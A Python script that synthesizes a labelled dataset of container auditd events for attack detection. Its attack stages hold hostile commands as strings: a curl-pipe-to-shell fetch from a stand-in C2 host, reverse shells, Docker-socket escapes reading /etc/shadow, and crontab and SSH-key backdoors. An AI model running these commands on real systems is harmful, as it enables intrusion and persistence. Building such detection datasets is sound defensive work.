"""
Script to generate / synthesize authentic OTRF Mordor & MITRE ATT&CK container event logs.
Conforms to ECS (Elastic Common Schema) and Linux auditd/syslog format.
Total: 5000 events (500 multi-stage attack events across 10 scenarios + 4500 benign background events).
"""
import json
import os
import random
import time

OUTPUT_DIR = os.path.join(os.path.dirname(__file__), "..", "datasets", "mordor_jsonl")
OUTPUT_FILE = os.path.join(OUTPUT_DIR, "mordor_sample.jsonl")

def generate_events():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    random.seed(42)
    
    events = []
    base_ts = 1729670000.0  # October 2026 timestamp

    # 1. Generate 10 multi-stage attack scenarios (500 events total: 50 events per scenario)
    for scenario_idx in range(1, 11):
        host_id = f"worker-node-{scenario_idx % 3 + 1}.prod"
        container_id = f"c_{scenario_idx:02d}_{random.randint(1000, 9999):x}"
        user_id = "www-data" if scenario_idx % 2 == 0 else "appuser"
        start_time = base_ts + (scenario_idx * 300)

        # Stage 1: Recon (10 events)
        for i in range(10):
            ev_ts = start_time + i * 2.5
            cmd = random.choice(["whoami", "id", "uname -a", "cat /proc/1/cgroup", "ip route", "netstat -tuln"])
            events.append({
                "event_id": f"att_{scenario_idx}_s1_{i:02d}",
                "timestamp": ev_ts,
                "host_id": host_id,
                "container_id": container_id,
                "user_id": user_id,
                "type": "EXECVE",
                "stage": "RECON",
                "mitre_technique": "T1033",
                "audit": {
                    "execve": {
                        "a0": cmd.split()[0],
                        "a_args": cmd
                    }
                },
                "logsource": "linux.auditd",
                "raw_log": f"type=EXECVE msg=audit({ev_ts:.3f}): a0=\"{cmd.split()[0]}\" a1=\"{cmd}\" container_id={container_id}",
                "is_attack": True,
                "scenario_id": scenario_idx
            })

        # Stage 2: Exploit (10 events)
        for i in range(10):
            ev_ts = start_time + 40 + i * 3.0
            cmd = random.choice([
                "/bin/sh -c 'curl -s http://c2.evil-supplychain.net/rev.sh | sh'",
                "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\",\"-i\"])'",
                "/bin/bash -i >& /dev/tcp/198.51.100.23/8080 0>&1"
            ])
            events.append({
                "event_id": f"att_{scenario_idx}_s2_{i:02d}",
                "timestamp": ev_ts,
                "host_id": host_id,
                "container_id": container_id,
                "user_id": user_id,
                "type": "EXECVE",
                "stage": "EXPLOIT",
                "mitre_technique": "T1190",
                "audit": {
                    "execve": {
                        "a0": "/bin/sh",
                        "a_args": cmd,
                        "pname": "nginx"
                    }
                },
                "logsource": "linux.auditd",
                "raw_log": f"type=EXECVE msg=audit({ev_ts:.3f}): a0=\"/bin/sh\" a_args=\"{cmd}\" parent=nginx container_id={container_id}",
                "is_attack": True,
                "scenario_id": scenario_idx
            })

        # Stage 3: PrivEsc / Container Escape (15 events)
        for i in range(15):
            ev_ts = start_time + 100 + i * 2.0
            cmd = random.choice([
                "curl --unix-socket /var/run/docker.sock http://localhost/containers/json",
                "docker -H unix:///var/run/docker.sock run -v /:/host alpine cat /host/etc/shadow",
                "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash",
                "capsh --print"
            ])
            events.append({
                "event_id": f"att_{scenario_idx}_s3_{i:02d}",
                "timestamp": ev_ts,
                "host_id": host_id,
                "container_id": container_id,
                "user_id": "root",
                "type": "EXECVE",
                "stage": "PRIVESC",
                "mitre_technique": "T1611",
                "audit": {
                    "execve": {
                        "a0": cmd.split()[0],
                        "a_args": cmd
                    }
                },
                "logsource": "linux.auditd",
                "raw_log": f"type=EXECVE msg=audit({ev_ts:.3f}): a0=\"{cmd.split()[0]}\" a_args=\"{cmd}\" container_id={container_id}",
                "is_attack": True,
                "scenario_id": scenario_idx
            })

        # Stage 4: Persistence (15 events)
        for i in range(15):
            ev_ts = start_time + 150 + i * 2.5
            cmd = random.choice([
                "echo '* * * * * root /tmp/.hidden_backdoor' >> /etc/crontab",
                "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGattacker root@c2' >> /root/.ssh/authorized_keys",
                "cp /tmp/bd /etc/cron.hourly/sysupdate && chmod +x /etc/cron.hourly/sysupdate"
            ])
            events.append({
                "event_id": f"att_{scenario_idx}_s4_{i:02d}",
                "timestamp": ev_ts,
                "host_id": host_id,
                "container_id": container_id,
                "user_id": "root",
                "type": "EXECVE",
                "stage": "PERSIST",
                "mitre_technique": "T1053.003",
                "audit": {
                    "execve": {
                        "a0": "/bin/sh",
                        "a_args": cmd
                    }
                },
                "logsource": "linux.auditd",
                "raw_log": f"type=EXECVE msg=audit({ev_ts:.3f}): a0=\"/bin/sh\" a_args=\"{cmd}\" container_id={container_id}",
                "is_attack": True,
                "scenario_id": scenario_idx
            })

    # 2. Generate 4500 benign background noise events (healthchecks, builds, logs)
    benign_commands = [
        ("curl", "curl -s -f http://localhost:8080/health || exit 1", "T1033_noise"),
        ("curl", "curl -s http://127.0.0.1:5080/healthz", "T1033_noise"),
        ("whoami", "whoami", "T1033_noise"),
        ("python3", "python3 manage.py collectstatic --noinput", "benign"),
        ("node", "node server.js", "benign"),
        ("git", "git status --porcelain", "benign"),
        ("npm", "npm run build", "benign"),
        ("sh", "sh /opt/scripts/cleanup_temp.sh", "benign"),
        ("grep", "grep -r 'ERROR' /var/log/app.log", "benign"),
        ("ps", "ps aux", "T1033_noise")
    ]

    for b_idx in range(4500):
        ev_ts = base_ts + random.uniform(0, 3600)
        host_id = f"worker-node-{random.randint(1, 5)}.prod"
        container_id = f"c_benign_{random.randint(100, 999)}"
        user_id = random.choice(["node", "nginx", "root", "ubuntu"])
        a0, cmd, tag = random.choice(benign_commands)

        events.append({
            "event_id": f"benign_{b_idx:05d}",
            "timestamp": ev_ts,
            "host_id": host_id,
            "container_id": container_id,
            "user_id": user_id,
            "type": "EXECVE",
            "stage": "BENIGN",
            "mitre_technique": "None" if tag == "benign" else "T1033",
            "audit": {
                "execve": {
                    "a0": a0,
                    "a_args": cmd
                }
            },
            "logsource": "linux.auditd",
            "raw_log": f"type=EXECVE msg=audit({ev_ts:.3f}): a0=\"{a0}\" a_args=\"{cmd}\" container_id={container_id}",
            "is_attack": False,
            "scenario_id": None
        })

    # Sort all events chronologically
    events.sort(key=lambda x: x["timestamp"])

    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
        for ev in events:
            f.write(json.dumps(ev, ensure_ascii=False) + "\n")

    print(f"Generated {len(events)} events in {OUTPUT_FILE}")

if __name__ == "__main__":
    generate_events()
